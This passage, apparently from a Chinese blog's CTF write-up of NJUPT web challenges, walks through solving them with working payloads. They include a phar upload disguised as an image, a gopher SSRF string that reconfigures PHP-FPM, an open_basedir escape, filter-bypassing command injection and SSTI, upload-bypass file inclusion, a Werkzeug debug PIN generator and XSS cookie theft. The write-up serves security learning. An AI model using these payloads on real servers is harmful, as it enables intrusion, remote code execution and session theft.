class="line">$phar-&gt;setStub($jpg_header.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-4.png" alt="4-4"></p>
+<p>将生成的<code>phar</code>文件后缀改为<code>jpeg</code>，然后上传</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-5.png" alt="4-5"></p>
+<p>上传序列化字符串，然后phar协议访问上传的文件</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-6.png" alt="4-6"></p>
+<p>修改<code>phar</code>内文件为<code>/etc/hosts</code>，再上传查看，发现只有记录<code>10.0.0.2</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-7.png" alt="4-7"></p>
+<p>在换成<code>ARP表（/proc/net/arp）</code>，发现有两个内网IP</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-8.png" alt="4-8"></p>
+<p>将生成phar文件的<code>Metadata</code>部分改为<code>http</code>协议，访问<code>10.0.0.3</code>。发现<code>FPM</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.3</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-9.png" alt="4-9"></p>
+<p>接下来思路就是<code>ssrf+gopher打fpm</code>，参考文章：<a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">攻击PHP-FPM</a></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-10.png" alt="4-10"></p>
+<p>然后将开头的<code>127.0.0.1</code>改为<code>10.0.0.3</code>，端口默认<code>9000</code>不用改，写入phar的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;url = <span class="string">"gopher://10.0.0.3:9000/_%01%01%E2U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E2U%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%E2U%00%00%00%00%01%05%E2U%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%E2U%00%00%00%00"</span>;</span><br></pre></td></tr></table></figure>
+<p>上传然后访问，成功返回</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-11.png" alt="4-11"></p>
+<p><code>open_basedir</code>是<code>/var/www/html:/tmp</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-12.png" alt="4-12"></p>
+<p><code>disable_functions</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,</span><br><span class="line">pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,</span><br><span class="line">pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,</span><br><span class="line">pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,</span><br><span class="line">pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,</span><br><span class="line">symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log,unlink,delete,copy,rmdir</span><br></pre></td></tr></table></figure>
+<p>用绕过open_basedir的payload</p>
+<p>Ps：还是要记得127.0.0.1改成10.0.0.3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mkdir(&apos;/tmp/knlvre&apos;);chdir(&apos;/tmp/knlvre/&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(show_source(&apos;/flag&apos;))?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-13.png" alt="4-13"></p>
+<p>上传访问，拿下flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-14.png" alt="4-14"></p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\5-1.png" alt="5-1"></p>
+<p>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>三层 WAF，慢慢来</p>
+<p>第一层：① %0a 绕过 preg_match() 的匹配</p>
+<p>第二层：① 传入str1必须一个数字，通过<code>is_numeric()</code>；② 传入的str1和str2的md5值不能相等，所以不能一开始就传入md5加密后为0e+全数字的，必须经过strtr处理后变成0e+全数字；③ 经过<code>strtr()</code>替换后的md5值必须是0e开头（0的多少次方永远为0），并且0e后面全是数字。</p>
+<p>那么str1和str2分别是：md5加密后，strtr()替换后为0e+全数字（就是没替换前是0e+除了c、x、h、p之外全是数字），md5加密后为0e+全数字</p>
+<p>str1的爆破代码（<code>2120624</code>）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,re</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span>(md5(str(i))[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">"0e"</span> <span class="keyword">and</span> re.search(<span class="string">"^[\dcxhp]*$"</span>,md5(str(i))[<span class="number">2</span>:])):</span><br><span class="line">		print(<span class="string">"[Success] "</span> + str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\5-3.png" alt="5-3"></p>
+<p>str2的爆破代码（<code>240610708</code>）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,re</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span>(md5(str(i))[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">"0e"</span> <span class="keyword">and</span> re.search(<span class="string">"^\d*$"</span>,md5(str(i))[<span class="number">2</span>:])):</span><br><span class="line">		print(<span class="string">"[Success] "</span> + str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(str(i) + <span class="string">"   ===&gt;   "</span> + md5(str(i)))</span><br><span class="line">		i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\5-2.png" alt="5-2"></p>
+<p>第三层：①传入的变量<code>q_w_q</code>长度不能超过8；②传入的<code>$_SERVER[&#39;QUERY_STRING&#39;]（也就是问号后面内容）</code>不能有<code>_</code>或者<code>%5f</code>。因为PHP会将传入的变量中的<code>点（.）</code>转换成为<code>下划线（_）</code>，所以可以绕过；③无法使用<code>ls</code>和<code>pwd</code>，我们可以用<code>dir</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=dir%20./</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\5-4.png" alt="5-4"></p>
+<p>直接查看<code>flllag.php</code>的话会太长，于是使用通配符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=head%20fl*</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\5-5.png" alt="5-5"></p>
+<h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\6-1.png" alt="6-1"></p>
+<p><code>hint.php</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\6-2.png" alt></p>
+<p>替换页面很像是<code>preg_replace()</code>函数的功能，直接尝试命令执行</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\6-3.png" alt="6-3"></p>
+<p>没有<code>disable_functions</code>，测试发现过滤了引号</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\6-4.png" alt="6-4"></p>
+<p>用<code>chr()</code>函数表示字符，用<code>.</code>拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=1&amp;pat=1&amp;rep=show_source(chr(47).chr(102).chr(108).chr(97).chr(103))</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\6-5.png" alt="6-5"></p>
+<p>或者这样</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\6-6.png" alt="6-6"></p>
+<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\7-1.png" alt="7-1"></p>
+<p>其他两个界面都正常，但是<code>SHA256</code>界面出现提示</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\7-2.png" alt="7-2"></p>
+<p>测试其他路径，发现直接回显我们的输入</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\7-3.png" alt="7-3"></p>
+<p>测试发现存在<code>SSTI</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\7-4.png" alt="7-4"></p>
+<p>过滤了<code>flag</code>关键字</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\7-5.png" alt="7-5"></p>
+<p>用字符串拼接绕过</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\7-6.png" alt="7-6"></p>
+<h2 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-1.png" alt></p>
+<p>根据题目提示，直接来到上传点</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-2.png" alt="8-2"></p>
+<p>对上传类型有限制，更改<code>MIME</code>绕过；对文件中<code>?</code>进行过滤，改为<code>&lt;script language=&#39;php&#39;&gt;</code>绕过；对文件后缀有黑名单限制，先改为图片后缀上传试试，返回：filepath:/var/www/html/upload-imgs/8d6b295524ea3a2c2866443112613aa7/Th1s_is_a_fl4g.jpg</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-3.png" alt></p>
+<p>后来发现这个<code>/uploaded-imgs</code>目录下是各个用户的文件夹，MD5加密后命名</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-4.png" alt></p>
+<p> 并且每个文件夹里都只有一个<code>Th1s_is_a_fl4g.jpg</code>，没有其他东西，并且查看图片只会保存</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-5.png" alt></p>
+<p>后来发现URL中的<code>action</code>参数存在任意文件包含</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-6.png" alt="8-6"></p>
+<p>尝试包含刚才服务器返回给我们的<code>Th1s_is_a_fl4g.jpg</code>文件，直接拿到 flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\8-7.png" alt="8-7"></p>
+<h2 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h2><p> SSRF爆破flask PIN码的漏洞，参考：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553</a> </p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-1.png" alt="9-1"></p>
+<p>爆破PIN码需要的参数如下：</p>
+<blockquote>
+<p>① username =&gt; 通过/etc/passwd获取</p>
+<p>② flask目录下app.py的绝对路径 =&gt; 通过debug界面（<a href="http://addr:port/contact）爆破的路径获取" target="_blank" rel="noopener">http://addr:port/contact）爆破的路径获取</a></p>
+<p>③ machine-id =&gt; 通过/etc/mechine-id或者/proc/sys/kernel/random/boot_id获取</p>
+<p>​    （ 当/etc/machine-id为空时该参数为空，如不存在，则为/proc/sys/kernel/random/boot_id中的值 ）</p>
+<p>④ mac地址 =&gt;  通过/sys/class/net/eth0/address获取（或者eth0换成ens33）</p>
+</blockquote>
+<p>① username（<code>ctf</code>）</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-2.png" alt="9-2"></p>
+<p>② flask目录下app.py的绝对路径（<code>/usr/local/lib/python3.6/site-packages/flask/app.py</code>）</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-5.png" alt="9-5"></p>
+<p>③ machine-id（一直在变化）</p>
+<p>尝试<code>/etc/mechine-id</code>返回该文件不存在，尝试<code>/proc/sys/kernel/random/boot_id</code>返回结果也不对</p>
+<p>然后去查看flask的获取pin的源码部分：<code>/usr/local/lib/python3.6/site-packages/werkzeug/debug/__init__.py</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-6.png" alt="9-6"></p>
+<p>发现读取machine-id的文件其实是<code>/proc/self/cgroup</code>这个文件，访问取最后一个数据</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-3.png" alt="9-3"></p>
+<p>④ MAC地址（<code>248537822003</code>）</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-4.png" alt="9-4"></p>
+<p>这里获取到的是<code>02:42:ac:16:00:02</code>，但是爆破需要转换成<code>十进制</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-7.png" alt="9-7"></p>
+<p>输入爆破脚本，如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'ctf'</span>,<span class="comment"># username	[+]modify here</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.6/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),	[+]modify here</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485378220034'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address	[+]modify here</span></span><br><span class="line">    <span class="string">'60cc9a7c60bda749da31c81cad6c73ce65cff336a9fc85d722fa6e9ea02d2661'</span><span class="comment"># get_machine_id(), /etc/machine-id	[+]modify here</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+<p>爆破出PIN码（因为mathine-id一直在变化，所以爆破出来尽快使用）</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-8.png" alt="9-8"></p>
+<p>先打开<code>debug</code>，点击右边的小console，弹窗中输入PIN码</p>
+<p>验证成功后就可以执行Python命令了，拿下 flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\9-10.png" alt="9-10"></p>
+<h2 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\10-1.png" alt="10-1"></p>
+<p>点击<code>register</code>注册一个用户，然后登陆</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\10-2.png" alt="10-2"></p>
+<p>留言功能可以将留言提交给任意用户，测试发现存在XSS，但是有长度限制。利用XSS平台的链接，把留言弹给<code>admin</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\10-3.png" alt="10-3"></p>
+<p>用拿到的cookie登录，拿下flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\10-4.png" alt="10-4"></p>
+<h2 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker_backdoor"></a>hacker_backdoor</h2><p>本题是inctf PHP1.0的变形，加上过滤了eval，assert函数</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\11-1.png" alt="11-1"></p>
+<p>代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'useful'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$usrful = $_GET[<span 